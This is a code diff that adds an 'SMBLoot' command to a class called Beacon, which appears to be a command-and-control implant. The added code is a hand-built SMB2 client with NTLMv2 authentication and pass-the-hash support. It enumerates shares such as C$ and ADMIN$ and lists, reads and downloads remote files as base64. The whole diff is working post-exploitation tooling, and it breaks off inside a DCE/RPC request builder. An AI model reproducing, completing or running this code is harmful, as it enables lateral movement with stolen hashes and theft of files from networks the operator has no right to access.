@@ -1426,6 +1426,760 @@ class Beacon:
         except Exception as e:
             return f"[error: {e}]"
 
+    # ── SMBLoot (pure-Python SMB2 client, no impacket) ──
+
+    def _smb2_negotiate(self, sock: socket.socket) -> bytes:
+        """SMB2 Negotiate → returns server GUID + security blob."""
+        neg = bytearray(36)
+        struct.pack_into("<H", neg, 0, 36)       # StructureSize
+        struct.pack_into("<H", neg, 2, 2)        # DialectCount
+        struct.pack_into("<H", neg, 4, 1)        # SecurityMode (signing enabled)
+        struct.pack_into("<H", neg, 6, 0)        # Reserved
+        struct.pack_into("<I", neg, 8, 0)        # Capabilities
+        neg += b"\x00" * 16                      # ClientGuid
+        neg += struct.pack("<I", 0)              # NegotiateContextOffset
+        neg += struct.pack("<H", 0)              # NegotiateContextCount
+        neg += struct.pack("<H", 0)              # Reserved2
+        neg += struct.pack("<H", 0x0202)         # Dialect SMB 2.0.2
+        neg += struct.pack("<H", 0x0210)         # Dialect SMB 2.1
+        self._smb2_send(sock, 0x0000, 0, 0, bytes(neg))
+        return self._smb2_recv(sock)
+
+    def _smb2_send(self, sock: socket.socket, command: int,
+                   msg_id: int, tree_id: int, payload: bytes,
+                   session_id: int = 0, flags: int = 0):
+        """Send an SMB2 packet with NetBIOS framing."""
+        hdr = bytearray(64)
+        hdr[0:4] = b"\xfeSMB"
+        struct.pack_into("<H", hdr, 4, 64)       # StructureSize
+        struct.pack_into("<H", hdr, 6, 0)        # CreditCharge
+        struct.pack_into("<I", hdr, 8, 0)        # Status
+        struct.pack_into("<H", hdr, 12, command)
+        struct.pack_into("<H", hdr, 14, 1)       # CreditRequest
+        struct.pack_into("<I", hdr, 16, flags)
+        struct.pack_into("<I", hdr, 20, 0)       # NextCommand
+        struct.pack_into("<Q", hdr, 24, msg_id)
+        struct.pack_into("<I", hdr, 36, tree_id)
+        struct.pack_into("<Q", hdr, 40, session_id)
+        hdr[48:64] = b"\x00" * 16               # Signature
+        pkt = bytes(hdr) + payload
+        nb = struct.pack(">I", len(pkt))
+        sock.sendall(nb + pkt)
+
+    def _smb2_recv(self, sock: socket.socket) -> bytes:
+        """Receive an SMB2 response, return full packet (header + body)."""
+        nb_hdr = self._recv_exact(sock, 4)
+        length = struct.unpack(">I", nb_hdr)[0]
+        return self._recv_exact(sock, length)
+
+    @staticmethod
+    def _recv_exact(sock: socket.socket, n: int) -> bytes:
+        buf = bytearray()
+        while len(buf) < n:
+            chunk = sock.recv(n - len(buf))
+            if not chunk:
+                raise ConnectionError("SMB connection closed")
+            buf.extend(chunk)
+        return bytes(buf)
+
+    def _ntlmv2_hash(self, password: str, username: str, domain: str) -> bytes:
+        """Compute NTLMv2 hash (NT hash → HMAC-MD5 with user+domain)."""
+        import hmac as _hmac
+        nt_hash = hashlib.new("md4", password.encode("utf-16-le")).digest()
+        identity = (username.upper() + domain.upper()).encode("utf-16-le")
+        return _hmac.new(nt_hash, identity, hashlib.md5).digest()
+
+    def _ntlm_auth(self, sock: socket.socket, username: str, password: str,
+                   domain: str, nt_hash: bytes = None) -> tuple:
+        """NTLM authentication over SMB2 SessionSetup. Returns (session_id, session_key)."""
+        import hmac as _hmac
+
+        # Type 1 (Negotiate)
+        neg_flags = 0xe2088217
+        type1 = b"NTLMSSP\x00" + struct.pack("<I", 1)
+        type1 += struct.pack("<I", neg_flags)
+        type1 += struct.pack("<HHI", 0, 0, 0)  # DomainNameFields
+        type1 += struct.pack("<HHI", 0, 0, 0)  # WorkstationFields
+
+        # Wrap in GSS-API / SPNEGO
+        blob1 = self._gss_wrap_ntlm(type1, is_init=True)
+
+        # SessionSetup request
+        setup = bytearray(24)
+        struct.pack_into("<H", setup, 0, 25)    # StructureSize
+        struct.pack_into("<B", setup, 2, 0)     # Flags
+        struct.pack_into("<B", setup, 3, 1)     # SecurityMode
+        struct.pack_into("<I", setup, 4, 0)     # Capabilities
+        struct.pack_into("<I", setup, 8, 0)     # Channel
+        struct.pack_into("<H", setup, 12, 88)   # SecurityBufferOffset (64 hdr + 24 body)
+        struct.pack_into("<H", setup, 14, len(blob1))
+        struct.pack_into("<Q", setup, 16, 0)    # PreviousSessionId
+        self._smb2_send(sock, 0x0001, 1, 0, bytes(setup) + blob1)
+        resp1 = self._smb2_recv(sock)
+
+        status = struct.unpack_from("<I", resp1, 8)[0]
+        session_id = struct.unpack_from("<Q", resp1, 40)[0]
+
+        if status != 0xc0000016:  # STATUS_MORE_PROCESSING_REQUIRED
+            raise PermissionError(f"NTLM negotiate failed: 0x{status:08x}")
+
+        # Extract Type 2 (Challenge) from response
+        sec_offset = struct.unpack_from("<H", resp1, 64 + 4)[0]
+        sec_length = struct.unpack_from("<H", resp1, 64 + 6)[0]
+        sec_blob = resp1[sec_offset:sec_offset + sec_length]
+        type2 = self._gss_unwrap_ntlm(sec_blob)
+
+        # Parse Type 2
+        server_challenge = type2[24:32]
+        target_info_len = struct.unpack_from("<H", type2, 40)[0]
+        target_info_off = struct.unpack_from("<I", type2, 44)[0]
+        target_info = type2[target_info_off:target_info_off + target_info_len]
+
+        # Compute NTLMv2 response
+        if nt_hash:
+            response_key = _hmac.new(nt_hash,
+                                     (username.upper() + domain.upper()).encode("utf-16-le"),
+                                     hashlib.md5).digest()
+        else:
+            nt_h = hashlib.new("md4", password.encode("utf-16-le")).digest()
+            response_key = _hmac.new(nt_h,
+                                     (username.upper() + domain.upper()).encode("utf-16-le"),
+                                     hashlib.md5).digest()
+
+        client_challenge = os.urandom(8)
+        timestamp = struct.pack("<Q", int((time.time() + 11644473600) * 10000000))
+        blob = b"\x01\x01\x00\x00\x00\x00\x00\x00"
+        blob += timestamp
+        blob += client_challenge
+        blob += b"\x00\x00\x00\x00"
+        blob += target_info
+        blob += b"\x00\x00\x00\x00"
+
+        nt_proof = _hmac.new(response_key, server_challenge + blob, hashlib.md5).digest()
+        nt_response = nt_proof + blob
+        session_key = _hmac.new(response_key, nt_proof, hashlib.md5).digest()
+
+        # Build Type 3 (Authenticate)
+        domain_enc = domain.encode("utf-16-le")
+        user_enc = username.encode("utf-16-le")
+        ws_enc = platform.node().encode("utf-16-le")
+
+        off = 88
+        type3 = b"NTLMSSP\x00" + struct.pack("<I", 3)
+        # LmChallengeResponse (24 bytes of zeros)
+        lm_resp = b"\x00" * 24
+        type3 += struct.pack("<HHI", len(lm_resp), len(lm_resp), off)
+        off += len(lm_resp)
+        type3 += struct.pack("<HHI", len(nt_response), len(nt_response), off)
+        off += len(nt_response)
+        type3 += struct.pack("<HHI", len(domain_enc), len(domain_enc), off)
+        off += len(domain_enc)
+        type3 += struct.pack("<HHI", len(user_enc), len(user_enc), off)
+        off += len(user_enc)
+        type3 += struct.pack("<HHI", len(ws_enc), len(ws_enc), off)
+        off += len(ws_enc)
+        type3 += struct.pack("<HHI", 0, 0, off)  # EncryptedRandomSession
+        type3 += struct.pack("<I", neg_flags)
+        type3 += b"\x00" * (88 - len(type3))  # Pad to offset
+        type3 += lm_resp + nt_response + domain_enc + user_enc + ws_enc
+
+        blob3 = self._gss_wrap_ntlm(type3, is_init=False)
+
+        setup2 = bytearray(24)
+        struct.pack_into("<H", setup2, 0, 25)
+        struct.pack_into("<B", setup2, 2, 0)
+        struct.pack_into("<B", setup2, 3, 1)
+        struct.pack_into("<I", setup2, 4, 0)
+        struct.pack_into("<I", setup2, 8, 0)
+        struct.pack_into("<H", setup2, 12, 88)
+        struct.pack_into("<H", setup2, 14, len(blob3))
+        struct.pack_into("<Q", setup2, 16, 0)
+        self._smb2_send(sock, 0x0001, 2, 0, bytes(setup2) + blob3, session_id=session_id)
+        resp2 = self._smb2_recv(sock)
+
+        status2 = struct.unpack_from("<I", resp2, 8)[0]
+        if status2 != 0:
+            raise PermissionError(f"NTLM auth failed: 0x{status2:08x}")
+
+        return session_id, session_key
+
+    @staticmethod
+    def _gss_wrap_ntlm(ntlm_bytes: bytes, is_init: bool) -> bytes:
+        """Minimal SPNEGO wrapper for NTLM tokens."""
+        ntlm_oid = b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"  # 1.3.6.1.4.1.311.2.2.10
+        spnego_oid = b"\x2b\x06\x01\x05\x05\x02"  # 1.2.840.113554.1.2.2
+
+        def _asn1_len(length: int) -> bytes:
+            if length < 0x80:
+                return struct.pack("B", length)
+            elif length < 0x100:
+                return b"\x81" + struct.pack("B", length)
+            else:
+                return b"\x82" + struct.pack(">H", length)
+
+        if is_init:
+            # mechToken [2]
+            mech_token = b"\xa2" + _asn1_len(len(ntlm_bytes) + 2) + \
+                         b"\x04" + _asn1_len(len(ntlm_bytes)) + ntlm_bytes
+            # mechTypes [0]
+            mech_type = b"\x06" + _asn1_len(len(ntlm_oid)) + ntlm_oid
+            mech_list = b"\x30" + _asn1_len(len(mech_type)) + mech_type
+            mech_types = b"\xa0" + _asn1_len(len(mech_list)) + mech_list
+            # negTokenInit SEQUENCE
+            inner = mech_types + mech_token
+            neg_init = b"\xa0" + _asn1_len(len(inner)) + inner
+            neg_seq = b"\x30" + _asn1_len(len(neg_init)) + neg_init
+            # Application [0] with SPNEGO OID
+            oid_enc = b"\x06" + _asn1_len(len(spnego_oid)) + spnego_oid
+            app_inner = oid_enc + neg_seq
+            return b"\x60" + _asn1_len(len(app_inner)) + app_inner
+        else:
+            # negTokenResp: responseToken [2]
+            resp_token = b"\xa2" + _asn1_len(len(ntlm_bytes) + 2) + \
+                         b"\x04" + _asn1_len(len(ntlm_bytes)) + ntlm_bytes
+            inner = resp_token
+            return b"\xa1" + _asn1_len(len(inner) + 2) + \
+                   b"\x30" + _asn1_len(len(inner)) + inner
+
+    @staticmethod
+    def _gss_unwrap_ntlm(blob: bytes) -> bytes:
+        """Extract NTLM message from SPNEGO response blob."""
+        # Search for NTLMSSP signature
+        idx = blob.find(b"NTLMSSP\x00")
+        if idx >= 0:
+            return blob[idx:]
+        raise ValueError("NTLMSSP not found in security blob")
+
+    def _smb2_tree_connect(self, sock: socket.socket, session_id: int,
+                           msg_id: int, share_path: str) -> tuple:
+        """TreeConnect to \\\\server\\share. Returns (tree_id, next_msg_id)."""
+        path_enc = share_path.encode("utf-16-le")
+        tc = bytearray(8)
+        struct.pack_into("<H", tc, 0, 9)     # StructureSize
+        struct.pack_into("<H", tc, 2, 0)     # Reserved
+        struct.pack_into("<H", tc, 4, 72)    # PathOffset (64+8)
+        struct.pack_into("<H", tc, 6, len(path_enc))
+        self._smb2_send(sock, 0x0003, msg_id, 0, bytes(tc) + path_enc,
+                        session_id=session_id)
+        resp = self._smb2_recv(sock)
+        status = struct.unpack_from("<I", resp, 8)[0]
+        if status != 0:
+            raise PermissionError(f"TreeConnect failed: 0x{status:08x} ({share_path})")
+        tree_id = struct.unpack_from("<I", resp, 36)[0]
+        return tree_id, msg_id + 1
+
+    def _smb2_create(self, sock: socket.socket, session_id: int,
+                     tree_id: int, msg_id: int, path: str,
+                     desired_access: int = 0x80000000,
+                     disposition: int = 1,
+                     options: int = 0) -> tuple:
+        """SMB2 Create (open file/dir). Returns (file_id_bytes, next_msg_id)."""
+        name_enc = path.encode("utf-16-le") if path else b""
+        cr = bytearray(56)
+        struct.pack_into("<H", cr, 0, 57)           # StructureSize
+        struct.pack_into("<B", cr, 2, 0)            # SecurityFlags
+        struct.pack_into("<B", cr, 3, 0)            # RequestedOplockLevel
+        struct.pack_into("<I", cr, 4, disposition)  # ImpersonationLevel=Impersonation
+        struct.pack_into("<Q", cr, 8, 0)            # SmbCreateFlags
+        struct.pack_into("<Q", cr, 16, 0)           # Reserved
+        struct.pack_into("<I", cr, 24, desired_access)
+        struct.pack_into("<I", cr, 28, 0x07)        # FileAttributes (normal)
+        struct.pack_into("<I", cr, 32, 0x07)        # ShareAccess (R|W|D)
+        struct.pack_into("<I", cr, 36, disposition)
+        struct.pack_into("<I", cr, 40, options)
+        struct.pack_into("<H", cr, 44, 120)         # NameOffset (64+56)
+        struct.pack_into("<H", cr, 46, len(name_enc))
+        struct.pack_into("<I", cr, 48, 0)           # CreateContextsOffset
+        struct.pack_into("<I", cr, 52, 0)           # CreateContextsLength
+        payload = bytes(cr) + (name_enc if name_enc else b"\x00\x00")
+        self._smb2_send(sock, 0x0005, msg_id, tree_id, payload,
+                        session_id=session_id)
+        resp = self._smb2_recv(sock)
+        status = struct.unpack_from("<I", resp, 8)[0]
+        if status != 0:
+            raise FileNotFoundError(f"Create failed: 0x{status:08x} ({path})")
+        file_id = resp[64 + 56:64 + 56 + 16]
+        return file_id, msg_id + 1
+
+    def _smb2_query_directory(self, sock: socket.socket, session_id: int,
+                              tree_id: int, msg_id: int,
+                              file_id: bytes, pattern: str = "*") -> tuple:
+        """SMB2 QueryDirectory (FileBothDirectoryInformation). Returns (entries, next_msg_id)."""
+        pat_enc = pattern.encode("utf-16-le")
+        qd = bytearray(32)
+        struct.pack_into("<H", qd, 0, 33)          # StructureSize
+        struct.pack_into("<B", qd, 2, 0x03)        # FileInfoClass: FileBothDirectoryInformation
+        struct.pack_into("<B", qd, 3, 0)            # Flags
+        struct.pack_into("<I", qd, 4, 0)            # FileIndex
+        qd[8:24] = file_id
+        struct.pack_into("<H", qd, 24, 96)          # FileNameOffset (64+32)
+        struct.pack_into("<H", qd, 26, len(pat_enc))
+        struct.pack_into("<I", qd, 28, 65536)       # OutputBufferLength
+
+        entries = []
+        first = True
+        while True:
+            if not first:
+                struct.pack_into("<B", qd, 3, 0)
+            self._smb2_send(sock, 0x000e, msg_id, tree_id,
+                            bytes(qd) + pat_enc, session_id=session_id)
+            resp = self._smb2_recv(sock)
+            msg_id += 1
+            status = struct.unpack_from("<I", resp, 8)[0]
+            if status == 0x80000006:  # STATUS_NO_MORE_FILES
+                break
+            if status != 0:
+                break
+            out_offset = struct.unpack_from("<H", resp, 64 + 2)[0]
+            out_length = struct.unpack_from("<I", resp, 64 + 4)[0]
+            data = resp[out_offset:out_offset + out_length]
+            entries.extend(self._parse_dir_info(data))
+            first = False
+            # Continue with next batch
+            struct.pack_into("<B", qd, 3, 0)  # no restart
+        return entries, msg_id
+
+    @staticmethod
+    def _parse_dir_info(data: bytes) -> list:
+        """Parse FileBothDirectoryInformation buffer."""
+        entries = []
+        offset = 0
+        while offset < len(data):
+            if offset + 94 > len(data):
+                break
+            next_entry = struct.unpack_from("<I", data, offset)[0]
+            file_name_length = struct.unpack_from("<I", data, offset + 60)[0]
+            file_attrs = struct.unpack_from("<I", data, offset + 56)[0]
+            file_size = struct.unpack_from("<Q", data, offset + 40)[0]
+            name_offset = offset + 104  # FileBothDirectoryInformation name is at +104
+            if name_offset + file_name_length > len(data):
+                break
+            name = data[name_offset:name_offset + file_name_length].decode(
+                "utf-16-le", errors="replace")
+            if name not in (".", ".."):
+                entries.append({
+                    "name": name,
+                    "size": file_size,
+                    "is_dir": bool(file_attrs & 0x10),
+                    "attrs": file_attrs,
+                })
+            if next_entry == 0:
+                break
+            offset += next_entry
+        return entries
+
+    def _smb2_read(self, sock: socket.socket, session_id: int,
+                   tree_id: int, msg_id: int, file_id: bytes,
+                   offset: int = 0, length: int = 65536) -> tuple:
+        """SMB2 Read. Returns (data, next_msg_id)."""
+        rd = bytearray(48)
+        struct.pack_into("<H", rd, 0, 49)          # StructureSize
+        struct.pack_into("<B", rd, 2, 0)           # Padding
+        struct.pack_into("<B", rd, 3, 0)           # Flags
+        struct.pack_into("<I", rd, 4, length)      # Length
+        struct.pack_into("<Q", rd, 8, offset)      # Offset
+        rd[16:32] = file_id
+        struct.pack_into("<I", rd, 32, 1)          # MinimumCount
+        struct.pack_into("<I", rd, 36, 0)          # Channel
+        struct.pack_into("<I", rd, 40, 0)          # RemainingBytes
+        struct.pack_into("<H", rd, 44, 0)          # ReadChannelInfoOffset
+        struct.pack_into("<H", rd, 46, 0)          # ReadChannelInfoLength
+        self._smb2_send(sock, 0x0008, msg_id, tree_id, bytes(rd),
+                        session_id=session_id)
+        resp = self._smb2_recv(sock)
+        status = struct.unpack_from("<I", resp, 8)[0]
+        if status == 0xc0000011:  # STATUS_END_OF_FILE
+            return b"", msg_id + 1
+        if status != 0:
+            raise IOError(f"Read failed: 0x{status:08x}")
+        data_offset = struct.unpack_from("<B", resp, 64 + 2)[0]
+        data_length = struct.unpack_from("<I", resp, 64 + 4)[0]
+        file_data = resp[data_offset:data_offset + data_length]
+        return file_data, msg_id + 1
+
+    def _smb2_close(self, sock: socket.socket, session_id: int,
+                    tree_id: int, msg_id: int, file_id: bytes) -> int:
+        """SMB2 Close file handle."""
+        cl = bytearray(24)
+        struct.pack_into("<H", cl, 0, 24)
+        struct.pack_into("<H", cl, 2, 0)     # Flags
+        struct.pack_into("<I", cl, 4, 0)     # Reserved
+        cl[8:24] = file_id
+        self._smb2_send(sock, 0x0006, msg_id, tree_id, bytes(cl),
+                        session_id=session_id)
+        self._smb2_recv(sock)
+        return msg_id + 1
+
+    def _smb2_tree_disconnect(self, sock: socket.socket, session_id: int,
+                              tree_id: int, msg_id: int) -> int:
+        """SMB2 TreeDisconnect."""
+        td = struct.pack("<HH", 4, 0)
+        self._smb2_send(sock, 0x0004, msg_id, tree_id, td,
+                        session_id=session_id)
+        self._smb2_recv(sock)
+        return msg_id + 1
+
+    def _exec_smbloot(self, args: str) -> str:
+        """
+        SMBLoot command — browse/download from SMB shares without loading extra packages.
+        Usage:
+            smbloot <server> <user> <pass_or_hash> [domain] [action] [path]
+        Actions:
+            shares               — list available shares
+            ls <share> [path]    — list directory
+            cat <share> <path>   — read file content (text preview)
+            get <share> <path>   — download file (base64)
+            tree <share> [path]  — recursive directory listing
+        Hash format: aad3b435b51404eeaad3b435b51404ee:ntlmhash (pass-the-hash)
+        """
+        try:
+            parts = args.strip().split()
+            if len(parts) < 3:
+                return ("Usage: smbloot <server> <user> <pass_or_hash> "
+                        "[domain] [action] [path]\n"
+                        "Actions: shares, ls, cat, get, tree\n"
+                        "Hash format: LM:NT (pass-the-hash)")
+
+            server = parts[0]
+            username = parts[1]
+            cred = parts[2]
+            domain = parts[3] if len(parts) > 3 and parts[3] not in (
+                "shares", "ls", "cat", "get", "tree") else "."
+            action_idx = 3 if domain == "." else 4
+            action = parts[action_idx] if len(parts) > action_idx else "shares"
+            remaining = parts[action_idx + 1:] if len(parts) > action_idx + 1 else []
+
+            # Determine password vs NT hash
+            nt_hash = None
+            password = cred
+            if re.match(r'^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$', cred):
+                nt_hash = bytes.fromhex(cred.split(":")[1])
+                password = ""
+            elif re.match(r'^[0-9a-fA-F]{32}$', cred):
+                nt_hash = bytes.fromhex(cred)
+                password = ""
+
+            port = 445
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((server, port))
+
+            try:
+                # Negotiate
+                self._smb2_negotiate(sock)
+                # Authenticate
+                session_id, _ = self._ntlm_auth(sock, username, password, domain, nt_hash)
+                msg_id = 3
+
+                if action == "shares":
+                    return self._smbloot_list_shares(sock, session_id, msg_id, server)
+                elif action == "ls":
+                    share = remaining[0] if remaining else "C$"
+                    path = remaining[1] if len(remaining) > 1 else ""
+                    return self._smbloot_ls(sock, session_id, msg_id, server, share, path)
+                elif action == "cat":
+                    if len(remaining) < 2:
+                        return "Usage: smbloot ... cat <share> <path>"
+                    share, fpath = remaining[0], remaining[1]
+                    return self._smbloot_cat(sock, session_id, msg_id, server, share, fpath)
+                elif action == "get":
+                    if len(remaining) < 2:
+                        return "Usage: smbloot ... get <share> <path>"
+                    share, fpath = remaining[0], remaining[1]
+                    return self._smbloot_get(sock, session_id, msg_id, server, share, fpath)
+                elif action == "tree":
+                    share = remaining[0] if remaining else "C$"
+                    path = remaining[1] if len(remaining) > 1 else ""
+                    return self._smbloot_tree(sock, session_id, msg_id, server, share, path)
+                else:
+                    return f"Unknown action: {action}\nAvailable: shares, ls, cat, get, tree"
+            finally:
+                sock.close()
+
+        except PermissionError as e:
+            return f"[auth error] {e}"
+        except ConnectionError as e:
+            return f"[connection error] {e}"
+        except Exception as e:
+            return f"[smbloot error] {e}"
+
+    def _smbloot_list_shares(self, sock, session_id, msg_id, server) -> str:
+        """List shares via IPC$ + SRVSVC (NetShareEnumAll)."""
+        share_path = f"\\\\{server}\\IPC$"
+        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
+        # Open srvsvc named pipe
+        try:
+            file_id, msg_id = self._smb2_create(
+                sock, session_id, tree_id, msg_id, "srvsvc",
+                desired_access=0x0012019f, disposition=1, options=0x00000040)
+            # Bind to SRVSVC
+            bind_pkt = self._dcerpc_bind(
+                b"\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88",
+                3, 0)
+            msg_id = self._smb2_write(sock, session_id, tree_id, msg_id, file_id, bind_pkt)
+            bind_resp, msg_id = self._smb2_read(sock, session_id, tree_id, msg_id, file_id)
+            # NetShareEnumAll RPC call
+            rpc_req = self._build_netshareenumall(server)
+            msg_id = self._smb2_write(sock, session_id, tree_id, msg_id, file_id, rpc_req)
+            rpc_resp, msg_id = self._smb2_read(sock, session_id, tree_id, msg_id, file_id,
+                                               length=65536)
+            shares = self._parse_netshareenumall(rpc_resp)
+            msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
+        except Exception as e:
+            shares = [f"(SRVSVC failed: {e} — trying fallback)"]
+            # Fallback: try connecting to well-known shares
+            shares = []
+            for sn in ["C$", "ADMIN$", "IPC$", "NETLOGON", "SYSVOL", "Users", "Shares"]:
+                try:
+                    tp = f"\\\\{server}\\{sn}"
+                    tid, _ = self._smb2_tree_connect(sock, session_id, msg_id, tp)
+                    shares.append({"name": sn, "type": 0, "comment": ""})
+                    self._smb2_tree_disconnect(sock, session_id, tid, msg_id + 1)
+                except Exception:
+                    pass
+
+        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
+
+        if not shares:
+            return "No shares found"
+        if isinstance(shares[0], str):
+            return "\n".join(shares)
+        lines = [f"{'Share':<20} {'Type':<10} {'Comment'}",
+                 "-" * 50]
+        type_map = {0: "Disk", 1: "Print", 2: "Device", 3: "IPC",
+                    0x80000000: "Disk$", 0x80000003: "IPC$"}
+        for s in shares:
+            t = type_map.get(s.get("type", 0), "Unknown")
+            lines.append(f"{s['name']:<20} {t:<10} {s.get('comment', '')}")
+        return "\n".join(lines)
+
+    def _smbloot_ls(self, sock, session_id, msg_id, server, share, path) -> str:
+        """List directory contents on a share."""
+        share_path = f"\\\\{server}\\{share}"
+        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
+        dir_path = path.replace("/", "\\").strip("\\") if path else ""
+        file_id, msg_id = self._smb2_create(
+            sock, session_id, tree_id, msg_id, dir_path,
+            desired_access=0x00100081, disposition=1,
+            options=0x00200021)  # FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT
+        entries, msg_id = self._smb2_query_directory(
+            sock, session_id, tree_id, msg_id, file_id)
+        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
+        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
+
+        if not entries:
+            return f"(empty) \\\\{server}\\{share}\\{dir_path}"
+        lines = [f"\\\\{server}\\{share}\\{dir_path}",
+                 f"{'Name':<40} {'Size':<12} {'Type'}",
+                 "-" * 60]
+        for e in sorted(entries, key=lambda x: (not x["is_dir"], x["name"].lower())):
+            t = "DIR" if e["is_dir"] else "FILE"
+            sz = "" if e["is_dir"] else str(e["size"])
+            lines.append(f"{e['name']:<40} {sz:<12} {t}")
+        lines.append(f"\n{len(entries)} entries")
+        return "\n".join(lines)
+
+    def _smbloot_cat(self, sock, session_id, msg_id, server, share, fpath) -> str:
+        """Read and display file content (text preview, max 64KB)."""
+        share_path = f"\\\\{server}\\{share}"
+        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
+        file_path = fpath.replace("/", "\\").strip("\\")
+        file_id, msg_id = self._smb2_create(
+            sock, session_id, tree_id, msg_id, file_path,
+            desired_access=0x80000000, disposition=1, options=0)
+        data = b""
+        offset = 0
+        while len(data) < 65536:
+            chunk, msg_id = self._smb2_read(
+                sock, session_id, tree_id, msg_id, file_id,
+                offset=offset, length=65536)
+            if not chunk:
+                break
+            data += chunk
+            offset += len(chunk)
+        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
+        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
+        return data.decode("utf-8", errors="replace")[:65536]
+
+    def _smbloot_get(self, sock, session_id, msg_id, server, share, fpath) -> str:
+        """Download file as base64 (JSON result with filename, size, data)."""
+        share_path = f"\\\\{server}\\{share}"
+        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
+        file_path = fpath.replace("/", "\\").strip("\\")
+        file_id, msg_id = self._smb2_create(
+            sock, session_id, tree_id, msg_id, file_path,
+            desired_access=0x80000000, disposition=1, options=0)
+        data = b""
+        offset = 0
+        max_size = 10 * 1024 * 1024
+        while len(data) < max_size:
+            chunk, msg_id = self._smb2_read(
+                sock, session_id, tree_id, msg_id, file_id,
+                offset=offset, length=65536)
+            if not chunk:
+                break
+            data += chunk
+            offset += len(chunk)
+        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
+        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
+        filename = fpath.replace("\\", "/").rsplit("/", 1)[-1]
+        return json.dumps({
+            "filename": filename,
+            "size": len(data),
+            "data": base64.b64encode(data).decode(),
+        })
+
+    def _smbloot_tree(self, sock, session_id, msg_id, server, share, path,
+                      depth: int = 0, max_depth: int = 3) -> str:
+        """Recursive directory listing."""
+        share_path = f"\\\\{server}\\{share}"
+        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
+        lines = []
+        self._smbloot_tree_recurse(sock, session_id, tree_id, msg_id,
+                                   path.replace("/", "\\").strip("\\"),
+                                   lines, 0, max_depth)
+        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id + 100)
+        if not lines:
+            return f"(empty) \\\\{server}\\{share}\\{path}"
+        header = f"\\\\{server}\\{share}\\{path}\n"
+        return header + "\n".join(lines[:2000])
+
+    def _smbloot_tree_recurse(self, sock, session_id, tree_id, msg_id,
+                              dir_path, lines, depth, max_depth):
+        """Helper for recursive tree listing."""
+        if depth > max_depth:
+            return msg_id
+        try:
+            file_id, msg_id = self._smb2_create(
+                sock, session_id, tree_id, msg_id, dir_path,
+                desired_access=0x00100081, disposition=1,
+                options=0x00200021)
+            entries, msg_id = self._smb2_query_directory(
+                sock, session_id, tree_id, msg_id, file_id)
+            msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
+        except Exception:
+            return msg_id
+
+        indent = "  " * depth
+        for e in sorted(entries, key=lambda x: (not x["is_dir"], x["name"].lower())):
+            if e["is_dir"]:
+                lines.append(f"{indent}[DIR]  {e['name']}")
+                sub = f"{dir_path}\\{e['name']}" if dir_path else e["name"]
+                msg_id = self._smbloot_tree_recurse(
+                    sock, session_id, tree_id, msg_id, sub, lines, depth + 1, max_depth)
+            else:
+                lines.append(f"{indent}       {e['name']} ({e['size']})")
+            if len(lines) > 2000:
+                lines.append(f"{indent}... (truncated)")
+                return msg_id
+        return msg_id
+
+    def _smb2_write(self, sock: socket.socket, session_id: int,
+                    tree_id: int, msg_id: int, file_id: bytes,
+                    data: bytes, offset: int = 0) -> int:
+        """SMB2 Write to a file/pipe."""
+        wr = bytearray(48)
+        struct.pack_into("<H", wr, 0, 49)          # StructureSize
+        struct.pack_into("<H", wr, 2, 112)         # DataOffset (64+48)
+        struct.pack_into("<I", wr, 4, len(data))   # Length
+        struct.pack_into("<Q", wr, 8, offset)      # Offset
+        wr[16:32] = file_id
+        struct.pack_into("<I", wr, 32, 0)          # Channel
+        struct.pack_into("<I", wr, 36, 0)          # RemainingBytes
+        struct.pack_into("<H", wr, 40, 0)          # WriteChannelInfoOffset
+        struct.pack_into("<H", wr, 42, 0)          # WriteChannelInfoLength
+        struct.pack_into("<I", wr, 44, 0)          # Flags
+        self._smb2_send(sock, 0x0009, msg_id, tree_id, bytes(wr) + data,
+                        session_id=session_id)
+        self._smb2_recv(sock)
+        return msg_id + 1
+
+    @staticmethod
+    def _dcerpc_bind(uuid_bytes: bytes, ver_major: int, ver_minor: int) -> bytes:
+        """Build a DCE/RPC Bind PDU for a given interface UUID."""
+        iface = uuid_bytes + struct.pack("<HH", ver_major, ver_minor)
+        ndr_uuid = (b"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11"
+                    b"\x9f\xe8\x08\x00\x2b\x10\x48\x60")
+        transfer = ndr_uuid + struct.pack("<HH", 2, 0)
+        ctx = struct.pack("<HBB", 0, 1, 0)  # context_id=0, num_transfer=1
+        ctx += iface + transfer
+        bind_body = struct.pack("<HHI", 4096, 4096, 0)  # max_xmit, max_recv, assoc_group
+        bind_body += struct.pack("<B", 1) + b"\x00" * 3  # num_ctx + padding
+        bind_body += ctx
+        # RPC header
+        hdr = struct.pack("<BBBBIHHI",
+                          5,   # version
+                          0,   # minor
+                          11,  # BIND
+                          0x03,  # PFC_FIRST_FRAG | PFC_LAST_FRAG
+                          0x10000000,  # data representation
+                          len(bind_body) + 16,  # frag_length
+                          0,   # auth_length
+                          0)   # call_id
+        return hdr + bind_body
+
+    def _build_netshareenumall(self, server: str) -> bytes:
+        """Build NetShareEnumAll DCE/RPC request."""
+        server_uni = (f"\\\\{server}\x00").encode("utf-16-le")
+        # Align to 4 bytes
+        pad = (4 - len(server_uni) % 4) % 4
+        # NDR: MaxCount, Offset, ActualCount, string
+        ndr_str = struct.pack("<III", len(server_uni) // 2,
+                              0, len(server_uni) // 2) + server_uni + b"\x00" * pad
